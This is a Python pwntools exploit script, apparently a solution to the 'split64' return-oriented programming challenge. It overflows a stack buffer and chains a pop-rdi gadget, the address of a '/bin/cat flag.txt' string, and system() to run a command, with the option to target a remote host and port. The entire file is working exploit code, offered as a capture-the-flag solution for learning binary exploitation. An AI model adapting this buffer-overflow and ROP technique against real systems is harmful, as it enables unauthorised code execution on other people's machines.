#!/usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux','splitw','-h']

#gdb_bool = True
gdb_bool = False

def exploit(r):
    
    r.recvuntil("> ")
    #r.sendline(cyclic(200,n=8))
    buf = ""
    buf += "A"*cyclic_find('faaaaaaa',n=8)
    buf += p64(0x400883) #pop rdi
    buf += p64(0x601060) #/bin/cat flag.txt
    buf += p64(0x400810) #system()
    r.sendline(buf)
    r.interactive()
    return


if __name__ == "__main__":
    log.info("For remote %s HOST PORT" % sys.argv[0])
    
    binary_name = "./split64"        #put binary name here
    e = ELF(binary_name)

    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(binary_name)
        print util.proc.pidof(r)
        gdb_cmd = [
            "b *0x400806",
            "c"


        ]
        if(gdb_bool):
            gdb.attach(r, gdbscript = "\n".join(gdb_cmd))
        #r = process("./LOLgame", env={"LD_PRELOAD" : "./libc.so.6.remote"})
        #pause()
        exploit(r)

